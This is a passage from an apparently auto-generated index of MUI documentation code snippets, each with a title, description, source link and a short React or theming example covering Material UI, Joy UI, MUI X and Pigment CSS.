'\"Segoe UI Symbol\"',\n    ].join(','),\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Enabling Aggregation Feature in MUI X Data Grid Premium\nDESCRIPTION: Shows how to activate the aggregation functionality in the DataGridPremium component using the experimentalFeatures prop. This enables the Aggregation option in column menus for supported column types.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/aggregation-functions.md#2025-04-22_snippet_1\n\nLANGUAGE: tsx\nCODE:\n```\n<DataGridPremium experimentalFeatures={{ aggregation: true }} {...otherProps} />\n```\n\n----------------------------------------\n\nTITLE: Customizing Scrollbar Colors in Material-UI Dark Theme\nDESCRIPTION: This snippet demonstrates how to customize scrollbar colors for better contrast in dark mode using Material-UI's theme customization. It uses the darkScrollbar utility function.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/css-baseline/css-baseline.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport darkScrollbar from '@mui/material/darkScrollbar';\n\nconst theme = createTheme({\n  components: {\n    MuiCssBaseline: {\n      styleOverrides: (themeParam) => ({\n        body: themeParam.palette.mode === 'dark' ? darkScrollbar() : null,\n      }),\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Problematic TypeScript Usage with SX Prop\nDESCRIPTION: This example demonstrates a common TypeScript error caused by type widening when using the sx prop with a separate style object. The type of flexDirection is inferred as string, which is too wide for the SX prop's expected type.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_21\n\nLANGUAGE: typescript\nCODE:\n```\nconst style = {\n  flexDirection: 'column',\n};\n\nexport default function App() {\n  return <Button sx={style}>Example</Button>;\n}\n\n// Type '{ flexDirection: string; }' is not assignable to type 'SxProps<Theme> | undefined'\n// Type '{ flexDirection: string; }' is not assignable to type 'CSSSelectorObject<Theme>'\n//   Property 'flexDirection' is incompatible with index signature\n//     Type 'string' is not assignable to type 'SystemStyleObject<Theme>'\n```\n\n----------------------------------------\n\nTITLE: Overriding Styles with theme.applyStyles and Specificity Handling\nDESCRIPTION: This example shows how theme.applyStyles has higher specificity when cssVariables is enabled, and demonstrates the proper way to override styles by also using theme.applyStyles when needed.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/dark-mode/dark-mode.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\nconst BaseButton = styled('button')(({ theme }) =>\n  theme.applyStyles('dark', {\n    backgroundColor: 'white',\n  }),\n);\n\nconst AliceblueButton = styled(BaseButton)({\n  backgroundColor: 'aliceblue', // In dark mode, backgroundColor will be white as theme.applyStyles() has higher specificity\n});\n\nconst PinkButton = styled(BaseButton)(({ theme }) =>\n  theme.applyStyles('dark', {\n    backgroundColor: 'pink', // In dark mode, backgroundColor will be pink\n  }),\n);\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Filter Options for Autocomplete\nDESCRIPTION: Demonstrates using the createFilterOptions factory to create custom filtering behavior. This example configures the filter to match from the start of options.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/autocomplete/autocomplete.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\nconst filterOptions = createFilterOptions({\n  matchFrom: 'start',\n  stringify: (option) => option.title,\n});\n\n<Autocomplete filterOptions={filterOptions} />;\n```\n\n----------------------------------------\n\nTITLE: Card Component HTML Anatomy\nDESCRIPTION: The HTML structure of the Card component and its supplementary components, showing how they nest within a single root div element.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/card/card.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"MuiCard-root\">\n  <div class=\"MuiCardCover-root\">\n    <!-- optional Card Cover layer -->\n  </div>\n  <div class=\"MuiCardContent-root\">\n    <!-- optional Card Content layer -->\n  </div>\n  <div class=\"MuiCardOverflow-root\">\n    <!-- optional Card Overflow utility -->\n  </div>\n  <div class=\"MuiCardActions-root\">\n    <!-- optional Card Actions layer -->\n  </div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Basic Button Group Usage\nDESCRIPTION: Shows basic implementation of ButtonGroup component wrapping Button and IconButton components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/button-group/button-group.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"BasicButtonGroup.js\"}\n```\n\n----------------------------------------\n\nTITLE: Integrating Joy UI Link with Next.js Pages Router\nDESCRIPTION: Shows how to integrate the Joy UI Link component with Next.js Pages Router. It uses the Next.js Link component wrapped around the Joy UI Link for proper routing.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/link/link.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nimport NextLink from 'next/link';\nimport Link from '@mui/joy/Link';\n\n<NextLink href=\"/docs\" passHref>\n  <Link>Read doc</Link>\n</NextLink>;\n```\n\n----------------------------------------\n\nTITLE: Customizing MUI Autocomplete Listbox Variant using slotProps in JavaScript (JSX)\nDESCRIPTION: Shows how to apply a different style variant specifically to the listbox part of the MUI `Autocomplete` component. While the main component uses the `plain` variant, the `slotProps` property is used to override the `listbox` slot's variant to `plain` (demonstrating the capability, though using the same variant here).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_15\n\nLANGUAGE: javascript\nCODE:\n```\n<Autocomplete\n  variant=\"plain\"\n  slotProps={{\n    listbox: {\n      variant: 'plain',\n    }\n  }}\n>\n\n```\n\n----------------------------------------\n\nTITLE: Configuring Stack Theme with Flexbox Gap\nDESCRIPTION: Theme configuration to enable flexbox gap spacing implementation for all Stack instances.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/stack/stack.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nimport { ThemeProvider, createTheme } from '@mui/material/styles';\nimport Stack from '@mui/material/Stack';\n\nconst theme = createTheme({\n  components: {\n    MuiStack: {\n      defaultProps: {\n        useFlexGap: true,\n      },\n    },\n  },\n});\n\nfunction App() {\n  return (\n    <ThemeProvider theme={theme}>\n      <Stack>…</Stack> {/* uses flexbox gap by default */}\n    </ThemeProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Stack with Min Width Fix\nDESCRIPTION: Example showing how to fix white-space: nowrap issues by setting minimum width.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/stack/stack.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<Stack direction=\"row\" sx={{ minWidth: 0 }}>\n  <Typography noWrap>\n```\n\n----------------------------------------\n\nTITLE: Customizing Checkbox Label Placement in React\nDESCRIPTION: Demonstrates how to change the placement of checkbox labels.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/checkboxes/checkboxes.md#2025-04-22_snippet_8\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"FormControlLabelPosition.js\"}\n```\n\n----------------------------------------\n\nTITLE: Basic Box Spacing Example in Material-UI\nDESCRIPTION: Basic example of using padding and margin spacing utilities with the Box component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/spacing/spacing.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ p: 1 }}>…\n<Box sx={{ m: 1 }}>…\n<Box sx={{ p: 2 }}>…\n```\n\n----------------------------------------\n\nTITLE: Customizing Shadow Colors in Joy UI Theme\nDESCRIPTION: Demonstrates how to change the shadow color by customizing the shadowChannel token for both light and dark color schemes. The shadowChannel must be specified as RGB channel values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-shadow/theme-shadow.md#2025-04-22_snippet_4\n\nLANGUAGE: js\nCODE:\n```\nimport { extendTheme } from '@mui/joy/styles';\n\nconst theme = extendTheme({\n  colorSchemes: {\n    light: {\n      shadowChannel: '12 12 12',\n    },\n    dark: {\n      shadowChannel: '0 0 0',\n    },\n  },\n});\n\n// Then, pass it to `<CssVarsProvider theme={theme}>`.\n```\n\n----------------------------------------\n\nTITLE: Importing MUI X date-fns Adapter for v2 and v3 (JSX)\nDESCRIPTION: These import statements illustrate how to select between AdapterDateFns implementations for date-fns v2.x and v3.x with MUI X pickers. Use the standard AdapterDateFns import for v2 and AdapterDateFnsV3 for v3. Required dependencies are the appropriate version of 'date-fns' and @mui/x-date-pickers package. No runtime parameters are needed, and these imports are consumed as adapters within MUI date/time picker components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v7.md#2025-04-22_snippet_5\n\nLANGUAGE: JSX\nCODE:\n```\n// date-fns v2.x\nimport { AdapterDateFns } from '@mui/x-date-pickers/AdapterDateFns';\n\n// date-fns v3.x\nimport { AdapterDateFns } from '@mui/x-date-pickers/AdapterDateFnsV3';\n```\n\n----------------------------------------\n\nTITLE: Creating Styled Components with `styled` and `css` in Pigment CSS (JSX)\nDESCRIPTION: This snippet demonstrates defining styled components using the `styled()` function from `@pigment-css/react`, showcasing both object syntax (`Title`) and tagged template literal syntax (`Container`). It also illustrates applying inline styles using the `css()` function directly to an element's `className` prop within a React component. The example shows basic styling, pseudo-class usage (`:hover`), and nested component styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/introducing-pigment-css.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport { styled, css } from '@pigment-css/react';\n\nconst Title = styled('h1') ({\n  fontSize: '2rem';\n});\n\nconst Container = styled.div`\n  border: 1px solid red;\n\n  &:hover {\n    border-color: blue;\n  }\n\n  ${Title} {\n    margin-bottom: 2.5rem;\n  }\n`;\n\nexport default function Modal() {\n  return (\n    <Container>\n      <Title>Hello</Title>\n      <p className={css({ color: 'pink' })}>World</p>\n    </Container>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Fixing Container Width Issues\nDESCRIPTION: Shows how to make the new Grid component grow to full width using the sx prop, addressing a common migration issue.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-grid-v2/upgrade-to-grid-v2.md#2025-04-22_snippet_10\n\nLANGUAGE: diff\nCODE:\n```\n-<GridLegacy container>\n+<Grid container sx={{ width: '100%' }}>\n\n // alternatively, if the Grid's parent is a flex container:\n-<GridLegacy container>\n+<Grid container sx={{ flexGrow: 1 }}>\n```\n\n----------------------------------------\n\nTITLE: Creating Responsive Layouts with CSS Grid and Box Components in React\nDESCRIPTION: Shows how to implement a responsive grid layout using the Box component with CSS Grid properties as an alternative to the Grid component, defining column spans for child elements.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-core-v5.md#2025-04-22_snippet_10\n\nLANGUAGE: jsx\nCODE:\n```\n<Box display=\"grid\" gridTemplateColumns=\"repeat(12, 1fr)\" gap={2}>\n  <Box gridColumn=\"span 8\">\n    <Item>xs=8</Item>\n  </Box>\n  <Box gridColumn=\"span 4\">\n    <Item>xs=4</Item>\n  </Box>\n  <Box gridColumn=\"span 4\">\n    <Item>xs=4</Item>\n  </Box>\n  <Box gridColumn=\"span 8\">\n    <Item>xs=8</Item>\n  </Box>\n</Box>\n```\n\n----------------------------------------\n\nTITLE: Basic JSS to TSS-React Migration Example\nDESCRIPTION: Demonstrates the basic transformation of a component using makeStyles from JSS to TSS-React, showing changes in imports, function syntax, and how to access the classes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migrating-from-jss.md#2025-04-22_snippet_6\n\nLANGUAGE: diff\nCODE:\n```\n import * as React from 'react';\n-import makeStyles from '@material-ui/styles/makeStyles';\n+import { makeStyles } from 'tss-react/mui';\n import Button from '@mui/material/Button';\n import Link from '@mui/material/Link';\n\n-const useStyles = makeStyles((theme) => {\n+const useStyles = makeStyles()((theme) => {\n   return {\n     root: {\n       color: theme.palette.primary.main,\n     },\n     apply: {\n       marginRight: theme.spacing(2),\n     },\n   };\n });\n\n function Apply() {\n-  const classes = useStyles();\n+  const { classes } = useStyles();\n\n   return (\n     <div className={classes.root}>\n       <Button component={Link} to=\"https://support.mui.com\" className={classes.apply}>\n         Apply now\n       </Button>\n     </div>\n   );\n }\n\n export default Apply;\n```\n\n----------------------------------------\n\nTITLE: Controlling Column Width with Inline Styles in Joy UI Table\nDESCRIPTION: This snippet demonstrates how to control column width using inline styles on the <th> element in a Joy UI Table.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/table/table.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<thead>\n  <tr>\n    <th style={{ width: '40%' }}>Column 1</th>\n    <th style={{ width: '64px' }}>Column 2</th>\n  </tr>\n</thead>\n```\n\n----------------------------------------\n\nTITLE: Downloading and Extracting the Material UI CRA Styled Components Example\nDESCRIPTION: Commands to download and extract the Material UI Create React App example with styled-components from the GitHub repository.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-cra-styled-components/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/material-ui-cra-styled-components\ncd material-ui-cra-styled-components\n```\n\n----------------------------------------\n\nTITLE: Customizing Divider Child Position\nDESCRIPTION: Demonstrates how to control the position of content within a Divider by overriding the CSS variable that determines child element placement.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/divider/divider.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\n<Divider sx={{ '--Divider-childPosition': '20%' }}> {/* the value can be any CSS valid unit */}\n```\n\n----------------------------------------\n\nTITLE: Setting Text Color from Theme Palette with sx Prop in Material UI JSX\nDESCRIPTION: Demonstrates setting the text `color` using a theme palette path (e.g., 'primary.main') via the `color` key in the `sx` prop on a Material UI Box component. The string value maps directly to the theme's color definition.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ color: 'primary.main' }} />\n// equivalent to color: theme => theme.palette.primary.main\n```\n\n----------------------------------------\n\nTITLE: Enabling CSS Layers in Material UI v7 for Client-Side Applications (TSX)\nDESCRIPTION: Illustrates how to enable the opt-in CSS layer support in Material UI v7 for client-side applications (e.g., using Vite or Create React App). It utilizes the `StyledEngineProvider` component from `@mui/material/styles` with the `enableCssLayer` prop set to `true`. Similar to the Next.js example, `GlobalStyles` are used to define the layer order (`theme`, `base`, `mui`, `components`, `utilities`), facilitating integration with tools that rely on CSS layers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v7-is-here.md#2025-04-22_snippet_2\n\nLANGUAGE: tsx\nCODE:\n```\n// main.js\nimport { StyledEngineProvider } from '@mui/material/styles';\nimport GlobalStyles from '@mui/material/GlobalStyles';\nimport App from './App';\n\ncreateRoot(document.getElementById('root')!).render(\n  <StrictMode>\n    <StyledEngineProvider enableCssLayer>\n      <GlobalStyles styles=\"@layer theme,base,mui,components,utilities;\" />\n      <App />\n    </StyledEngineProvider>\n  </StrictMode>,\n);\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Pagination with DataGrid apiRef in React (TypeScript)\nDESCRIPTION: Demonstrates usage of the DataGrid apiRef from MUI X v6 to programmatically control pagination via the Data Grid API. Depends on MUI X DataGrid component and the useGridApiRef hook. The key parameter is apiRef, which provides an imperative handle to set the page (e.g., setPage(0)), and is passed into the DataGrid. The input is user interaction (button click), and the output is the DataGrid updating to the first page; ensure you have @mui/x-data-grid@v6 installed. Requires React and supporting MUI dependencies.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v6.md#2025-04-22_snippet_0\n\nLANGUAGE: tsx\nCODE:\n```\nfunction CustomDataGrid(props) {\n  const apiRef = useGridApiRef();\n\n  return (\n    <div>\n      <Button onClick={() => apiRef.current.setPage(0)}>\n        Go to page first page\n      </Button>\n      <DataGrid apiRef={apiRef} {...other} />\n    </div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Accessible Radio Button\nDESCRIPTION: Example showing how to add accessibility attributes to a Radio component using inputProps.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/radio-buttons/radio-buttons.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Radio\n  value=\"radioA\"\n  inputProps={{\n    'aria-label': 'Radio A',\n  }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Emotion Cache for Material UI with Pages Router\nDESCRIPTION: Diff showing how to set up a custom Emotion cache for Material UI in the Next.js Pages Router _document.tsx file.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_13\n\nLANGUAGE: diff\nCODE:\n```\n ...\n\n MyDocument.getInitialProps = async (ctx) => {\n   const finalProps = await documentGetInitialProps(ctx, {\n+    emotionCache: createCustomCache(),\n   });\n   return finalProps;\n };\n```\n\n----------------------------------------\n\nTITLE: Animated FAB with Zoom Transition\nDESCRIPTION: Shows how to implement animated Floating Action Buttons using the Zoom transition effect with enter delay.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/floating-action-button/floating-action-button.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nFloatingActionButtonZoom.js\n```\n\n----------------------------------------\n\nTITLE: Replacing TextField with Input Components in Joy UI\nDESCRIPTION: This codemod replaces the TextField component with a composition of FormControl, FormLabel, Input, and FormHelperText components in Joy UI. It updates the props and structure to match the new component API.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_67\n\nLANGUAGE: diff\nCODE:\n```\n-import TextField from '@mui/joy/TextField';\n+import FormControl from '@mui/joy/FormControl';\n+import FormLabel from '@mui/joy/FormLabel';\n+import FormHelperText from '@mui/joy/FormHelperText';\n+import Input from '@mui/joy/Input';\n\n-<TextField\n-  id=\"Id\"\n-  label=\"Label\"\n-  placeholder=\"Placeholder\"\n-  helperText=\"Help!\"\n-  name=\"Name\"\n-  type=\"tel\"\n-  autoComplete=\"on\"\n-  autoFocus\n-  error\n-  required\n-  fullWidth\n-  defaultValue=\"DefaultValue\"\n-  size=\"sm\"\n-  color=\"primary\"\n-  variant=\"outlined\"\n-/>\n+<FormControl\n+  id=\"Id\"\n+  required\n+  size=\"sm\"\n+  color=\"primary\">\n+  <FormLabel>\n+    Label\n+  </FormLabel>\n+  <JoyInput\n+    placeholder=\"Placeholder\"\n+    name=\"Name\"\n+    type=\"tel\"\n+    autoComplete=\"on\"\n+    autoFocus\n+    error\n+    fullWidth\n+    defaultValue=\"DefaultValue\"\n+    variant=\"outlined\" />\n+  <FormHelperText id=\"Id-helper-text\">\n+    Help!\n+  </FormHelperText>\n+</FormControl>\n```\n\n----------------------------------------\n\nTITLE: Setting Justify Content with Material-UI Box Component in JSX\nDESCRIPTION: Shows how to align flex items along the main axis using the justifyContent property. Options include flex-start, flex-end, center, space-between, space-around, and space-evenly.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/flexbox/flexbox.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ justifyContent: 'flex-start' }}>…\n<Box sx={{ justifyContent: 'flex-end' }}>…\n<Box sx={{ justifyContent: 'center' }}>…\n<Box sx={{ justifyContent: 'space-between' }}>…\n<Box sx={{ justifyContent: 'space-around' }}>…\n<Box sx={{ justifyContent: 'space-evenly' }}>…\n```\n\n----------------------------------------\n\nTITLE: Setting Font Weight in Material-UI with JSX\nDESCRIPTION: Demonstrates how to set font weight using the Box component in Material-UI. It shows both named weights and numeric values, which can be defined in the theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/typography/typography.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ fontWeight: 'light' }}>… // theme.typography.fontWeightLight\n<Box sx={{ fontWeight: 'regular' }}>…\n<Box sx={{ fontWeight: 'medium' }}>…\n<Box sx={{ fontWeight: 500 }}>…\n<Box sx={{ fontWeight: 'bold' }}>…\n```\n\n----------------------------------------\n\nTITLE: Adjusting Font Awesome Icon Size\nDESCRIPTION: Theme configuration to adjust the size and padding of Font Awesome icons when used with the Icon component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/icons/icons.md#2025-04-22_snippet_7\n\nLANGUAGE: js\nCODE:\n```\nconst theme = createTheme({\n  components: {\n    MuiIcon: {\n      styleOverrides: {\n        root: {\n          // Match 24px = 3 * 2 + 1.125 * 16\n          boxSizing: 'content-box',\n          padding: 3,\n          fontSize: '1.125rem',\n        },\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Augmenting DefaultTheme in TypeScript for Material UI v5\nDESCRIPTION: Fixes TypeScript errors related to missing theme properties by extending the DefaultTheme interface from @mui/styles with the Theme from @mui/material/styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/troubleshooting.md#2025-04-22_snippet_5\n\nLANGUAGE: ts\nCODE:\n```\n// it could be your App.tsx file or theme file that is included in your tsconfig.json\nimport { Theme } from '@mui/material/styles';\n\ndeclare module '@mui/styles/defaultTheme' {\n  // eslint-disable-next-line @typescript-eslint/no-empty-interface (remove this line if you don't have the rule enabled)\n  interface DefaultTheme extends Theme {}\n}\n```\n\n----------------------------------------\n\nTITLE: Applying Both Light and Dark Styles Using colorSchemes Object\nDESCRIPTION: Demonstrates how to access theme.colorSchemes directly to apply different styles for light and dark modes when CSS-based approaches aren't possible.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_13\n\nLANGUAGE: javascript\nCODE:\n```\nconst Custom = styled('div')(({ theme }) => ({\n  color: alpha(theme.colorSchemes.light.palette.text.primary, 0.5),\n  ...theme.applyStyles('dark', {\n    color: alpha(theme.colorSchemes.dark.palette.text.primary, 0.5),\n  }),\n}));\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI Next.js Example\nDESCRIPTION: Commands to download and extract the Material UI example project with Pigment CSS and TypeScript integration from GitHub.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-pigment-css-nextjs-ts/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-pigment-css-nextjs-ts\ncd material-ui-pigment-css-nextjs-ts\n```\n\n----------------------------------------\n\nTITLE: Running JSS to TSS-React Codemod in Material-UI v5\nDESCRIPTION: Command to run the codemod tool that automatically migrates JSS styles to the TSS-React API. This is the recommended first step in the migration process.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migrating-from-jss.md#2025-04-22_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/jss-to-tss-react <path>\n```\n\n----------------------------------------\n\nTITLE: Typography Menu Workaround\nDESCRIPTION: Menu implementation using Typography component to handle text overflow.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/menus/menus.md#2025-04-22_snippet_9\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"TypographyMenu.js\", \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Importing No-SSR Component in React\nDESCRIPTION: Shows how to import the No-SSR component from Material-UI for use in a React application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/no-ssr/no-ssr.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport NoSsr from '@mui/material/NoSsr';\n```\n\n----------------------------------------\n\nTITLE: Setting Custom Inset for Nested Lists\nDESCRIPTION: Example of using CSS variables to customize the spacing at the start of nested lists, providing better visual hierarchy.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/list/list.md#2025-04-22_snippet_8\n\nLANGUAGE: js\nCODE:\n```\n<List sx={{ '--List-nestedInsetStart': '1rem' }}> {/* This is the root List */}\n```\n\n----------------------------------------\n\nTITLE: Applying Border Width with sx Prop in Material UI JSX\nDESCRIPTION: Demonstrates setting a solid black border using the `border` key within the `sx` prop on a Material UI Box component. A numeric value provided to `border` defines the border width in pixels.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ border: 1 }} />\n// equivalent to border: '1px solid black'\n```\n\n----------------------------------------\n\nTITLE: Importing Pigment CSS Styles in Vite Main File\nDESCRIPTION: A diff snippet showing how to import the Pigment CSS styles at the top of the main file in a Vite project.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_6\n\nLANGUAGE: diff\nCODE:\n```\n import * as React from 'react';\n+import '@mui/material-pigment-css/styles.css';\n import App from './App';\n\n ReactDOM.createRoot(document.getElementById('root')).render(\n   <React.StrictMode>\n     <App />\n   </React.StrictMode>,\n );\n```\n\n----------------------------------------\n\nTITLE: Implementing Dot Badge in React Material-UI\nDESCRIPTION: Shows how to create a dot-style badge for notification purposes without displaying a count.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/badges/badges.md#2025-04-22_snippet_6\n\nLANGUAGE: JSX\nCODE:\n```\nDotBadge.js\n```\n\n----------------------------------------\n\nTITLE: Restoring theme.palette.text.hint Key\nDESCRIPTION: Example showing how to restore the removed theme.palette.text.hint key if your application depends on it.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_17\n\nLANGUAGE: diff\nCODE:\n```\n  import { createTheme } from '@mui/material/styles';\n\n-const theme = createTheme(),\n+const theme = createTheme({\n+  palette: { text: { hint: 'rgba(0, 0, 0, 0.38)' } },\n+});\n```\n\n----------------------------------------\n\nTITLE: Configuring Font Size in Material UI Theme\nDESCRIPTION: Example of adjusting the base font size in Material UI theme, which affects the entire typography scale.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/typography/typography.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst theme = createTheme({\n  typography: {\n    // In Chinese and Japanese the characters are usually larger,\n    // so a smaller fontsize may be appropriate.\n    fontSize: 12,\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Using theme.breakpoints.only Example\nDESCRIPTION: Example of using theme.breakpoints.only to apply styles specifically for the md breakpoint range.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/breakpoints/breakpoints.md#2025-04-22_snippet_6\n\nLANGUAGE: js\nCODE:\n```\nconst styles = (theme) => ({\n  root: {\n    backgroundColor: 'blue',\n    // Match [md, md + 1)\n    //       [md, lg)\n    //       [900px, 1200px)\n    [theme.breakpoints.only('md')]: {\n      backgroundColor: 'red',\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Image Layout with Masonry Component\nDESCRIPTION: Shows how to use Masonry specifically for image layouts, organizing content by rows instead of columns.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/masonry/masonry.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nImageMasonry.js\n```\n\n----------------------------------------\n\nTITLE: Transforming Sizing Values in JavaScript\nDESCRIPTION: A function that transforms sizing values. If the value is between 0 and 1 (exclusive), it's converted to a percentage. Otherwise, it's used as-is.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/sizing/sizing.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nfunction transform(value) {\n  return value <= 1 && value !== 0 ? `${value * 100}%` : value;\n}\n```\n\n----------------------------------------\n\nTITLE: Installing MUI Lab Package Dependencies\nDESCRIPTION: Commands to install @mui/lab and @mui/material packages using different package managers (npm, pnpm, yarn).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/about-the-lab/about-the-lab.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/lab @mui/material\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @mui/lab @mui/material\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/lab @mui/material\n```\n\n----------------------------------------\n\nTITLE: Applying Padding using CSS Variables in Grid v2 Item (JavaScript)\nDESCRIPTION: Shows how a Grid v2 item calculates its padding using the CSS `calc()` function, referencing the `--Grid-rowSpacing` and `--Grid-columnSpacing` variables set by its container component. This decouples the item from the container's implementation details.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/build-layouts-faster-with-grid-v2.md#2025-04-22_snippet_4\n\nLANGUAGE: js\nCODE:\n```\n{\n  padding: `calc(var(--Grid-rowSpacing) / 2) calc(var(--Grid-columnSpacing) / 2)`,\n}\n```\n\n----------------------------------------\n\nTITLE: Using Link Component as a Button in Joy UI\nDESCRIPTION: Demonstrates how to use the Link component as a button when there's no meaningful href or when the design resembles a button more than a link. It uses the 'component' prop to change the rendered element.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/link/link.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n<Link\n  component=\"button\"\n  onClick={() => {\n    // ...process something\n  }}\n>\n  Do something\n</Link>\n```\n\n----------------------------------------\n\nTITLE: Updating Dialog Transition Props\nDESCRIPTION: Consolidates Dialog transition props into TransitionProps object.\nSOURCE: 